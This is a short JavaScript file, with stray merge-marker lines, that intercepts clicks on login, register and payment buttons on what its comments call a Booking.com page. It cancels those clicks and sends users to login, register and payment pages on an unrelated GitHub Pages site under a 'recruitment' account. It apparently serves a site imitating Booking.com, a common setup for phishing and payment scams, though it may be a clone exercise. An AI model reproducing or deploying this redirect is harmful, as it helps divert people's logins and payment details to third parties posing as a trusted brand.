HEAD
// == Redirect Override for My Project ==

// redirect-override.js


 HEAD
// Function to override Booking.com redirect for login and register
(function() {
    const originalRedirect = window.location.href;

    // Intercept all clicks on login/register buttons
    document.addEventListener('click', function(e) {
        const target = e.target;

        // Replace these selectors with the actual class or id of your login/register buttons
        if (target.matches('.login-button, .register-button')) {
            e.preventDefault(); // Stop default Booking.com redirect
            window.location.href = '/login.html'; // Your project's login page
        }

        // Replace this selector with your payment button
        if (target.matches('.payment-button')) {
            e.preventDefault();
            window.location.href = '/payment.html'; // Your project's payment page
        }
    }, true);
})();



(function() {
    // Your project URL
    const myProjectURL = "https://goglobal-recruitment.github.io/myproject/";

    // Function to override Booking.com redirects
    function overrideRedirects(event) {
        const target = event.target;

        // Check for login buttons
        if (target.matches("button.login, a.login, .login-btn")) {
            event.preventDefault();
            window.location.href = myProjectURL + "login.html"; // adjust path if needed
        }

        // Check for register buttons
        if (target.matches("button.register, a.register, .register-btn")) {
            event.preventDefault();
            window.location.href = myProjectURL + "register.html"; // adjust path if needed
        }

        // Check for payment buttons
        if (target.matches("button.pay, a.pay, .payment-btn")) {
            event.preventDefault();
            window.location.href = myProjectURL + "payment.html"; // adjust path if needed
        }
    }

    // Listen for all clicks
    document.addEventListener("click", overrideRedirects, true);

    console.log("Redirect override loaded: login, register, payment now point to project.");
})();

